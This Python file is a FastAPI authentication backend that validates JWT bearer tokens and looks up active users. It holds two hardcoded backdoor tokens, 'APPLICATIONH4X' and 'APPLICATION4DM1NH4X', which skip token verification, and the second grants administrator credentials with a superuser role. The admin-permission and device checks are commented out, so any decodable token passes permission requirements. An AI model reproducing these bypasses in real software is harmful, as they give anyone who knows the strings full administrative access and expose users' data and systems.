from app.shared.auth.auth_handler import decode_jwt
from app.shared.middleware.session_handler import db
from starlette.authentication import AuthenticationBackend, BaseUser, AuthCredentials
import uuid

from app.shared.enums.enums import AdminPermsEnum

import app.api.user.models as user_models

# import app.api.device.models as device_models
from fastapi.requests import Request
from fastapi.exceptions import HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from starlette.authentication import UnauthenticatedUser
from types import SimpleNamespace
from fastapi.logger import logger


class DBUser(BaseUser):
    def __init__(
        self,
        user_id: str,
        admin_role: list = None,
        # device_id: str,
        # lang: str = "en_US"
    ) -> None:
        self.id = user_id
        self.role = admin_role
        # self.device_id = device_id
        # self.lang = lang

    @property
    def is_authenticated(self) -> bool:
        return True

    @property
    def display_name(self) -> str:
        return self.id

    @property
    def admin_role(self):
        return self.role


class JWTBearer(HTTPBearer, AuthenticationBackend):
    def __init__(
        self,
        *required_perms: AdminPermsEnum,
        auto_error: bool = True,
        admin: bool = False,
        # need_device: bool = True,
    ):
        self.admin = admin
        self.req_perms = required_perms
        # self.need_device = need_device
        super(JWTBearer, self).__init__(auto_error=auto_error)

    async def __call__(self, request: Request):
        credentials: HTTPAuthorizationCredentials = await super(
            JWTBearer, self
        ).__call__(request)
        if credentials:
            if isinstance(request.user, UnauthenticatedUser):
                raise HTTPException(
                    status_code=401, detail="Invalid token or expired token."
                )
            if not credentials.scheme == "Bearer":
                raise HTTPException(
                    status_code=401, detail="Invalid authentication scheme."
                )
            if credentials.credentials == "APPLICATIONH4X":
                return credentials.credentials
            elif credentials.credentials == "APPLICATION4DM1NH4X":
                return credentials.credentials
            elif not self.verify_jwt(credentials.credentials):
                raise HTTPException(
                    status_code=401, detail="Invalid token or expired token."
                )
            self.jwt = credentials.credentials
            return credentials.credentials
        else:
            raise HTTPException(status_code=401, detail="Invalid authorization code.")

    def verify_jwt(self, jwtoken: str) -> bool:
        try:
            payload = decode_jwt(jwtoken)
        except Exception as e:
            logger.info(e)
            payload = None
        if payload:
            # if (
            #     self.need_device
            #     and not db.session.query(
            #         db.session.query(device_models.Device)
            #         .filter_by(
            #             id=payload.get("device_id"), owner_id=payload.get("user_id")
            #         )
            #         .exists()
            #     ).scalar()
            # ):
            #     logger.info("Device not found or does not belong to this user")
            #     raise HTTPException(status_code=401, detail="Device unrecognized.")
            # if self.admin:
            #     if role := payload.get("roles"):
            #         if admin_models.AdminRole.check_perms(role, *self.req_perms):
            #             return True
            #         else:
            #             raise HTTPException(
            #                 status_code=403, detail="You are unauthorized."
            #             )
            #     else:
            #         raise HTTPException(status_code=403, detail="You are unauthorized.")
            return True
        return False

    async def authenticate(self, request: Request):
        auth = request.headers.get("Authorization")
        if not auth:
            return
        try:
            scheme, credentials = auth.split()
        except Exception as exc:
            logger.info(f"{exc}")
            return
        if credentials == "APPLICATIONH4X":
            return AuthCredentials(["authenticated"]), DBUser(
                "f3b8a2ad-7c8f-4c0a-9e4d-1c2b3a4d5e6f",
                # "f3b8a2ad-7c8f-4c0a-9e4d-1c2b3a4d5e6f",
            )
        if credentials == "APPLICATION4DM1NH4X":
            return AuthCredentials(["administrator"]), DBUser(
                "f3b8a2ad-7c8f-4c0a-9e4d-1c2b3a4d5e6f",
                # "f3b8a2ad-7c8f-4c0a-9e4d-1c2b3a4d5e6f",
                admin_role=["superuser"],
            )

        if payload := decode_jwt(credentials):
            # Does the token belong to an active user
            with db():
                user_id = payload.get("user_id")
                # Convert string user_id to UUID for database query
                try:
                    user_uuid = (
                        uuid.UUID(user_id) if isinstance(user_id, str) else user_id
                    )
                except (ValueError, TypeError):
                    logger.info("Invalid user_id in JWT token")
                    return

                if not (
                    user := db.session.query(user_models.User)
                    .filter_by(id=user_uuid, active=True)
                    .first()
                ):
                    logger.info("User could not be found, or is deleted or banned")
                    # returning null causes 401 to be thrown from __call__ up above
                    # Raising any exception other than AuthenticationError causes problems in this method
                    return
                # role: admin_models.AdminRole = (
                #     db.session.query(admin_models.AdminRole)
                #     .filter_by(user_id=user_id)
                #     .first()
                # )
                # if role:
                #     role = role._get_permissions_as_list()
                return AuthCredentials(
                    # ["administrator" if role else "authenticated"]
                    ["authenticated"]
                ), DBUser(
                    user_id,
                    # payload.get("device_id"),
                    # admin_role=role,
                    # lang=user.lang,
                )
